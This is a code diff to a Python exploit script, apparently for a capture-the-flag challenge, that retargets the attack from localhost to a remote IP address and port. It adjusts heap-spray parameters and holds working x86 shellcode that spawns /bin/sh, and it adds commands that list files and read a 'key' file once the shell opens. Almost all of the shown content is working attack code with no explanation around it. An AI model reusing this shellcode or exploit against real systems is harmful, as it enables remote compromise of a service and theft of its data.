@@ -13,7 +13,7 @@ import errno
 #
 ###############################################################################
 
-LOCAL = True
+LOCAL = False
 
 if LOCAL:
     HOST = "localhost"
@@ -22,15 +22,15 @@ if LOCAL:
 else:
     HOST = "54.215.5.83"
     PORT = "3036"
-    SLEEP_TIME = .1
+    SLEEP_TIME = 0
+    #SLEEP_TIME = .01
 
 NOP = "\x90"
 
 #HEAP_ADDRESS = "\x08\xca\x40\x08"
-HEAP_ADDRESS = "\x08\x28\x20\x08"
-MAX_ENTRIES = 16390
+HEAP_ADDRESS = "\x08\x68\x20\x08"
+MAX_ENTRIES = 8000
 #MAX_ENTRIES = 16384
-#MAX_ENTRIES = 2500
 
 # Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
 SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
@@ -210,6 +210,9 @@ def send_movie(movie,con):
 #
 ################################################################################
 def go_interactive(con):
+    con.write("ls\n")
+    con.write("cat key\n")
+
     while True:
         time.sleep(1)
         print con.read_one(0)
@@ -222,7 +225,7 @@ def go_interactive(con):
 ################################################################################
 def hijack_execution(con):
 
-    time.sleep(5)
+    #time.sleep(5)
 
     # Setup overflow string
     overflow_string = ""
@@ -243,7 +246,7 @@ def hijack_execution(con):
     # Clear out the read buffer
     con.read_one(0)
 
-    pause_script_msg("Press Enter to Pwn")
+    #pause_script_msg("Press Enter to Pwn")
     
     # Send the "movie title"
     con.send_line(overflow_string)
@@ -395,7 +398,8 @@ def build_movie():
 # Start the connection
 con = connect()
 
-pause_script_msg("Press Enter to start exploit")
+#pause_script_msg("Press Enter to start exploit")
+time.sleep(1)
 
 movie = build_movie()
 
